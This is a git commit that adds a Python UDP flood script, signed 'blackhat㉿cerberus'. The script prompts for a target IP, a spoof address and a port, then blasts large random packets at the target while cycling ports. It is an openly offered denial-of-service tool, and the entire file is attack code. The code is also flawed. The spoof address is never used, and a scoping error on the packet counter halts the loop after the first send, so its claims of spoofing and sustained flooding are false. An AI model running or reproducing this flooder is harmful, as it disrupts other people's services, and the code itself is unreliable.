624f8fec2bf941edf7e7ea0e76f289be8a37039c
cerberus <155488884+X-The-Mystic@users.noreply.github.com>
2024-01-16 17:55:28 -0500

    Create main.py

---
+++ main.py
@@ -0,0 +1,41 @@
+import random
+import socket
+
+print("\n\n")
+print("         +-------------------------------------+")
+print("         |     Author: blackhat㉿cerberus       |")
+print("         |            Version: 0.1             |")
+print("         +-------------------------------------+ ")
+
+print("\n\n")
+
+print("Enter IP Address of The Target ")
+target = input("\t == > ")
+print("Enter The Fake IP Address that you want to spoof.")
+fake_ip = input("\t\t ==> ")
+print("Enter The Port Number You Want to Attack ? ")
+port = input("\t\t ==> ")
+
+port = int(port)
+
+attack_num = 0
+
+print("Sending Packets...")
+
+def attack(target, fake_ip, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        for i in range(1, 100**1000):
+            sock.sendto(random.randbytes(10)*1000, (target, port))
+            print(f"Sent: {i}")
+            attack_num += 1
+        while True:
+            sock.sendto(random.randbytes(10)*1000, (target, port))
+            attack_num += 1
+            port = (port + 1) % 65535
+            print(f"Sent {attack_num} packet to {target} through port: {port}")
+
+    except Exception as e:
+        print("An error occurred during the attack:", e)
+
+attack(target, fake_ip, port)
